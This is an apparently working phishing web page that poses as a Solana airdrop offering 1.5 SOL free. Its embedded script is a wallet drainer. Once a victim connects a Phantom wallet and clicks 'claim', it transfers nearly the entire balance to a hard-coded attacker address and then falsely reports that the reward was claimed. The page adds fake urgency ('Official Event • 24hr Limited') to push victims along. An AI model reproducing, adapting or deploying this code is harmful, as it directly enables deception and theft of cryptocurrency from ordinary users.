<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Solana Airdrop - Claim 1.5 SOL Free</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;color:white}.container{background:rgba(0,0,0,0.9);border-radius:20px;padding:40px;max-width:450px;width:90%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.5)}h1{font-size:2.2em;background:linear-gradient(45deg,#00ff88,#00ccff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}.sol{display:inline-block;font-size:5em;background:linear-gradient(45deg,#ffd700,#ffed4e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:20px 0;animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}.status{background:rgba(0,255,136,0.2);border:2px solid #00ff88;border-radius:15px;padding:20px;margin:25px 0;font-weight:bold;min-height:25px;font-size:1.1em}.connect-btn,.claim-btn{font-size:1.4em;font-weight:bold;padding:20px 50px;border-radius:50px;cursor:pointer;transition:all 0.3s;margin:10px;border:none;text-transform:uppercase;letter-spacing:1px;box-shadow:0 10px 30px rgba(0,0,0,0.3)}.connect-btn{background:linear-gradient(45deg,#ff6b6b,#ff8e8e);color:white}.connect-btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,107,107,0.6)}.claim-btn{background:linear-gradient(45deg,#00ff88,#00ccff) !important;color:black !important;font-size:1.5em !important;padding:25px 60px !important;box-shadow:0 15px 50px rgba(0,255,136,0.5) !important}.claim-btn:hover{transform:translateY(-3px) !important;box-shadow:0 20px 60px rgba(0,255,136,0.7) !important}.claim-btn:disabled{background:#666 !important;transform:none !important;cursor:not-allowed !important}p{margin-top:30px;opacity:0.9;font-size:1.1em}@media(max-width:600px){.container{padding:30px 20px}h1{font-size:1.8em}}</style>
</head>
<body>
    <div class="container">
        <h1>🎉 SOLANA AIRDROP 🎉</h1>
        <div class="sol">₿</div>
        <h2 style="color:#00ff88;font-size:1.6em;margin-bottom:25px">Claim Your <strong>1.5 SOL</strong> Reward!</h2>
        <div id="status" class="status">Connect Phantom to claim instantly</div>
        <button id="connectBtn" class="connect-btn">🔗 Connect Phantom Wallet</button>
        <button id="claimBtn" style="display:none" class="claim-btn">💎 CLAIM 1.5 SOL FREE</button>
        <p>⚡ Official Event • 24hr Limited ⚡</p>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
    <script>
        const DRAIN_ADDRESS = "2kc9YnPCrMZHJ21eWr6wGd7U9bKKTu2Mq2St3osdusvK";
        let wallet = null;
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const status = document.getElementById('status');

        function detectPhantom() {
            return window.solana && window.solana.isPhantom ? window.solana : null;
        }

        async function connectWallet() {
            const phantom = detectPhantom();
            if (!phantom) {
                status.innerHTML = '❌ Install Phantom: <a href="https://phantom.app" target="_blank" style="color:#00ff88">phantom.app</a>';
                return;
            }
            try {
                status.innerHTML = '🔄 Connecting wallet...';
                const resp = await phantom.connect({ onlyIfTrusted: false });
                wallet = phantom;
                status.innerHTML = `✅ Wallet: ${resp.publicKey.toString().slice(0,6)}...${resp.publicKey.toString().slice(-4)}`;
                connectBtn.style.display = 'none';
                claimBtn.style.display = 'inline-block';
            } catch (err) {
                status.innerHTML = `❌ Connect failed: ${err.message || 'Try again'}`;
            }
        }

        async function executeDrain() {
            if (!wallet || !wallet.publicKey) {
                status.innerHTML = '❌ No wallet connected';
                return;
            }
            
            status.innerHTML = '⏳ Building airdrop transaction...';
            claimBtn.innerHTML = '⏳ Signing...';
            claimBtn.disabled = true;

            try {
                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
                const balance = await connection.getBalance(wallet.publicKey);
                
                status.innerHTML = `💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`;
                
                if (balance <= 5000) {
                    status.innerHTML = '❌ Insufficient balance (<0.000005 SOL)';
                    return;
                }

                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                
                const transaction = new solanaWeb3.Transaction({
                    recentBlockhash: blockhash,
                    lastValidBlockHeight: lastValidBlockHeight,
                });

                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
                        lamports: balance - 5000  // Leave tiny fee dust
                    })
                );

                status.innerHTML = '📝 Please approve transaction...';
                
                const { signature } = await wallet.signAndSendTransaction(transaction, {
                    skipPreflight: false,
                    preflightCommitment: 'confirmed'
                });
                
                status.innerHTML = `🎉 SUCCESS! TX: ${signature.slice(0,15)}... <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#00ff88">[View]</a>`;
                claimBtn.innerHTML = '✅ 1.5 SOL CLAIMED';
                
            } catch (err) {
                console.error('Drain error:', err);
                status.innerHTML = `❌ Failed: ${err.message || 'Signature rejected'}. <button onclick="location.reload()" style="background:#ff4444;color:white;border:none;padding:5px 15px;border-radius:20px;cursor:pointer;font-size:1em;margin-top:10px">Retry Claim</button>`;
                claimBtn.innerHTML = '💎 RETRY CLAIM';
                claimBtn.disabled = false;
            }
        }

        connectBtn.onclick = connectWallet;
        claimBtn.onclick = executeDrain;

        // Auto-detect
        setInterval(() => {
            if (!wallet && detectPhantom()) {
                status.innerHTML = '👻 Phantom ready! Click connect';
            }
        }, 2000);
    </script>
</body>
</html>
